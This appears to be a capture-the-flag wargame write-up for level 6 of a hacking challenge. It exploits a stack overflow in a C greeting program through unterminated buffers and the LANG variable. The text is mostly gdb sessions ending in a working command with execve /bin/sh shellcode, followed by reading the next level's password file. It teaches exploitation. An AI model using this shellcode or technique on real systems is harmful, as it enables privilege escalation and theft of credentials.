The source code:
```
//written by bla
//inspired by nnp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

enum{
LANG_ENGLISH,
LANG_FRANCAIS,
LANG_DEUTSCH,
};

int language = LANG_ENGLISH;

struct UserRecord{
    char name[40];
    char password[32];
    int id;
};

void greetuser(struct UserRecord user){
    char greeting[64];
    switch(language){
        case LANG_ENGLISH:
            strcpy(greeting, "Hi "); break;
        case LANG_FRANCAIS:
            strcpy(greeting, "Bienvenue "); break;
        case LANG_DEUTSCH:
            strcpy(greeting, "Willkommen "); break;
    }
    strcat(greeting, user.name);
    printf("%s\n", greeting);
}

int main(int argc, char **argv, char **env){
    if(argc != 3) {
        printf("USAGE: %s [name] [password]\n", argv[0]);
        return 1;
    }

    struct UserRecord user = {0};
    strncpy(user.name, argv[1], sizeof(user.name));
    strncpy(user.password, argv[2], sizeof(user.password));
    char *envlang = getenv("LANG");
    if(envlang)
        if(!memcmp(envlang, "fr", 2))
            language = LANG_FRANCAIS;
        else if(!memcmp(envlang, "de", 2))
            language = LANG_DEUTSCH;

    greetuser(user);
}
```

At first glance, we can see we have a structure with a username and password buffer and that argv[1] and argv[2] are copied into using the sizeof operator which won't let us copy more into those buffers than is allowed. We also see that they're checking the environment variable LANG to see its value so they know what language to greet us with in the greetuser() function. 

One thing to notice, though, is that they're not checking to make sure the username and password buffers are null terminated. B eing that they're adjacent in memory, this means that if we put 40 bytes into the username buffer, we can sort of connect it to the password buffer making it one buffer with a max of 72 bytes.

The entire user structure is passed into the greetuser() function meaning that our 72 byte buffer is passed into it.
```
(gdb) run $(python -c 'print "A"*40') $(python -c 'print "B"*32')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /levels/level06 $(python -c 'print "A"*40') $(python -c 'print "B"*32')

Breakpoint 1, 0x080486aa in main ()
1: x/10i $eip
=> 0x80486aa <main+279>:    call   0x804851c <greetuser>
   0x80486af <main+284>:    lea    esp,[ebp-0xc]
   0x80486b2 <main+287>:    pop    ebx
   0x80486b3 <main+288>:    pop    esi
   0x80486b4 <main+289>:    pop    edi
   0x80486b5 <main+290>:    pop    ebp
   0x80486b6 <main+291>:    ret    
   0x80486b7:   nop
   0x80486b8:   nop
   0x80486b9:   nop
(gdb) x/20xw $esp
0xbffffbb0:  0x41414141  0x41414141  0x41414141  0x41414141
0xbffffbc0:  0x41414141  0x41414141  0x41414141  0x41414141
0xbffffbd0:  0x41414141  0x41414141  0x42424242  0x42424242
0xbffffbe0:  0x42424242  0x42424242  0x42424242  0x42424242
0xbffffbf0:  0x42424242  0x42424242  0x00000000  0x00000001
```

We can see right before we call greetuser() that our two buffers have become one large one that is about 72 bytes long. So now if we just let this run maybe we'll get a seg fault.
```
(gdb) c
Continuing.
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x080486b2 in main ()
1: x/10i $eip
=> 0x80486b2 <main+287>:    pop    ebx
   0x80486b3 <main+288>:    pop    esi
   0x80486b4 <main+289>:    pop    edi
   0x80486b5 <main+290>:    pop    ebp
   0x80486b6 <main+291>:    ret    
   0x80486b7:   nop
   0x80486b8:   nop
   0x80486b9:   nop
   0x80486ba:   nop
   0x80486bb:   nop
(gdb)
```

Doesn't look like anything really interesting happened. The buffer we're trying to overflow is the `char greeting[64]` buffer. We've got a word being strcpy'd into the buffer first depending on the LANG environment variable. If LANG is "en", we get the word "Hi" copied into it. Maybe if we had the largest word copied into that buffer first we would end up overwriting the return address. Looks like we need LANG to be "de" so we can have Willkommen copied into the buffer first so let's do that.
```
level6@io:/levels$ export LANG="de"
level6@io:/levels$ echo $LANG
de
```

Great, now let's try running the program to make sure it reads it correctly.
```
level6@io:/levels$ ./level06 user pass
Willkommen user
```

Now let's try the same command line arguments and see if we overwrite the return address.
```
level6@io:/levels$ gdb -q level06
Reading symbols from /levels/level06...(no debugging symbols found)...done.
(gdb) run $(python -c 'print "A"*40') $(python -c 'print "B"*32')
Starting program: /levels/level06 $(python -c 'print "A"*40') $(python -c 'print "B"*32')
Willkommen AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/20xw $esp
0xbffffbb0: 0x00424242  0x41414141  0x41414141  0x41414141
0xbffffbc0: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffffbd0: 0x41414141  0x41414141  0x42424242  0x42424242
0xbffffbe0: 0x42424242  0x42424242  0x42424242  0x42424242
0xbffffbf0: 0x42424242  0x42424242  0x00000000  0x00000001
```

Things are looking good. The stack doesn't seem to move around at all so we can need to figure out exactly where we're overwriting the return address and overwrite it with the address 0xbffffbb4 which points to the start of the As and replace the start of the As with the same shellcode we used for the previous level.
```
(gdb) run $(python -c 'print "A"*40') $(python -c 'print "B"*24 + "CCCCDDDD"')
Starting program: /levels/level06 $(python -c 'print "A"*40') $(python -c 'print "B"*24 + "CCCCDDDD"')
Willkommen AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBCCCCDDDD

Program received signal SIGSEGV, Segmentation fault.
0x44434343 in ?? ()
(gdb) run $(python -c 'print "A"*40') $(python -c 'print "B"*24 + "CCCCCDDDD"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level06 $(python -c 'print "A"*40') $(python -c 'print "B"*24 + "CCCCCDDDD"')
Willkommen AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBCCCCCDDD

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
```

Now we know that the last 4 Cs overwrite the return address. Let's replace them with "\xb4\xfb\xff\xbf" (0xbffffbb4 on the stack) and see if we hit 0x41414141.
```
(gdb) run $(python -c 'print "A"*40') $(python -c 'print "B"*24 + "C\xb4\xfb\xff\xbfDDDD"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level06 $(python -c 'print "A"*40') $(python -c 'print "B"*24 + "C\xb4\xfb\xff\xbfDDDD"')
Willkommen AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBC????DDD

Program received signal SIGILL, Illegal instruction.
0xbffffbf3 in ?? ()
(gdb) x/20xw $esp
0xbffffbb0: 0x00444444  0x41414141  0x41414141  0x41414141
0xbffffbc0: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffffbd0: 0x41414141  0x41414141  0x42424242  0x42424242
0xbffffbe0: 0x42424242  0x42424242  0x42424242  0x42424242
0xbffffbf0: 0xfffbb443  0x444444bf  0x00000000  0x00000001
(gdb) si

Program terminated with signal SIGILL, Illegal instruction.
The program no longer exists.
```

Let's replace those first few As with some SIGTRAPs (0xcc) and see if we hit those.
```
(gdb) run $(python -c 'print "\xcc"*12 + "A"*28') $(python -c 'print "B"*24 + "C\xb4\xfb\xff\xbfDDDD"')
Starting program: /levels/level06 $(python -c 'print "\xcc"*12 + "A"*28') $(python -c 'print "B"*24 + "C\xb4\xfb\xff\xbfDDDD"')
Willkommen ????????????AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBC????DDD

Program received signal SIGTRAP, Trace/breakpoint trap.
0xbffffbb5 in ?? ()
```

That looks better! Let's make the first few As NOPs (0x90) and add our shellcode onto the end of that.
```
(gdb) run $(python -c 'print "\x90"*16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80A"') $(python -c 'print "B"*24 + "C\xb4\xfb\xff\xbfDDDD"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /levels/level06 $(python -c 'print "\x90"*16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80A"') $(python -c 'print "B"*24 + "C\xb4\xfb\xff\xbfDDDD"')
Willkommen ????????????????1?Ph//shh/bin??PS??
                                              ̀ABBBBBBBBBBBBBBBBBBBBBBBBC????DDD
process 17463 is executing new program: /bin/bash
sh-4.2$
```

That's great! Now let's step out of the debugger and see if it works.
```
level6@io:/levels$ ./level06 $(python -c 'print "\x90"*16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80A"') $(python -c 'print "B"*24 + "C\xb4\xfb\xff\xbfDDDD"')
Willkommen ????????????????1?Ph//shh/bin??PS??
                                              ̀ABBBBBBBBBBBBBBBBBBBBBBBBC????DDD
Illegal instruction
```

This isn't so surprising, address space in the debugger differs than address space outside of the debugger so let's just try playing around with the last byte of the EIP overwrite.
```
level6@io:/levels$ ./level06 $(python -c 'print "\x90"*16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80A"') $(python -c 'print "B"*24 + "C\xb8\xfb\xff\xbfDDDD"')
Willkommen ????????????????1?Ph//shh/bin??PS??
                                              ̀ABBBBBBBBBBBBBBBBBBBBBBBBC????DDD
Segmentation fault
level6@io:/levels$ ./level06 $(python -c 'print "\x90"*16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80A"') $(python -c 'print "B"*24 + "C\xbc\xfb\xff\xbfDDDD"')
Willkommen ????????????????1?Ph//shh/bin??PS??
                                              ̀ABBBBBBBBBBBBBBBBBBBBBBBBC????DDD
Segmentation fault
level6@io:/levels$ ./level06 $(python -c 'print "\x90"*16 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80A"') $(python -c 'print "B"*24 + "C\xc0\xfb\xff\xbfDDDD"')
Willkommen ????????????????1?Ph//shh/bin??PS??
                                              ̀ABBBBBBBBBBBBBBBBBBBBBBBBC????DDD
sh-4.2$ whoami
level7
sh-4.2$ cat /home/level7/.pass
[Level 7 password]
sh-4.2$ 
```

If you look back through the code above, you'll see that the EIP overwrite changed from "\xb4\xfb\xff\xbf" to "\xb8\xfb\xff\xbf", then to "\xbc\xfb\xff\xbf", and finally to "\xc0\xfb\xff\xbf" before it worked. So the address was a little off and now we have our shell :)
